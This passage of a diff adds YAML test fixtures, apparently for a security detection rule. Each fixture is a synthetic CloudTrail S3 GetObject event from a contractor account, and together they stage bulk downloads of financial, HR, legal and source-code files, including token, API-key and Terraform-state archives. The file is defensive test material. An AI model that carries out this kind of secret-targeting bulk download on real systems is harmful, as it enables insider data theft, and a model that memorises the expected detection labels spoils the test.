+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q3/revenue_report.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #32 — data staging (32 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q3/expense_report.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #33 — data staging (33 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2023/Q4/audit_report.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #34 — data staging (34 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q2/board_presentation.pptx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #35 — data staging (35 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q1/budget_forecast.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #36 — data staging (36 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/headcount_report.csv
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #37 — data staging (37 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/compensation_bands.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #38 — data staging (38 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/performance_reviews.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #39 — data staging (39 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2023/org_chart.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #40 — data staging (40 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/contractor_roster.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #41 — data staging (41 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: designs/architecture_v3.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #42 — data staging (42 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: designs/patent_filings_2024.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #43 — data staging (43 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: research/market_analysis_q4.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #44 — data staging (44 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: designs/ui_wireframes.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #45 — data staging (45 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: research/competitor_analysis.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #46 — data staging (46 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/billing/billing_service.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #47 — data staging (47 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/identity/auth_tokens.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #48 — data staging (48 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/core/database_schema.sql
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #49 — data staging (49 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/api/api_keys_config.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #50 — data staging (50 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/infra/terraform_state.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #51 — data staging (51 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: contracts/vendor_agreements_2024.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #52 — data staging (52 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: contracts/client_msa_templates.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #53 — data staging (53 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: litigation/case_notes_2024.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #54 — data staging (54 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: compliance/sox_audit_2024.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #55 — data staging (55 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: contracts/nda_signed_copies.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
